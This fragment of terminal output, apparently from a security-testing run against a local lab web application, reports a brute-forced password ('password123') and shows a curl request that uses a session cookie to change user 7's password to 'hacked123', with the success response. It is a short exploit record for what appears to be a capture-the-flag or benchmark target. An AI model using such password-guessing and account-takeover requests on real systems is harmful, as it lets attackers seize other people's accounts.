[32m│[0m {"success":true,"data":{"username":"admin","restaurants":[...]}}             [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m 2. Successful password brute force (found "password123"):                    [32m│[0m
[32m│[0m ```bash                                                                      [32m│[0m
[32m│[0m curl -s -X POST http://127.0.0.1:32901/api/change_password.php \             [32m│[0m
[32m│[0m   -b "PHPSESSID=0e155fhdv61k03ndarpjisu63l" \                                [32m│[0m
[32m│[0m   -d                                                                         [32m│[0m
[32m│[0m "userId=7&oldPassword=password123&newPassword=hacked123&confirmPassword=hack [32m│[0m
[32m│[0m ed123"                                                                       [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m Response: {"success":true,"message":"Password changed successfully."}        [32m│[0m
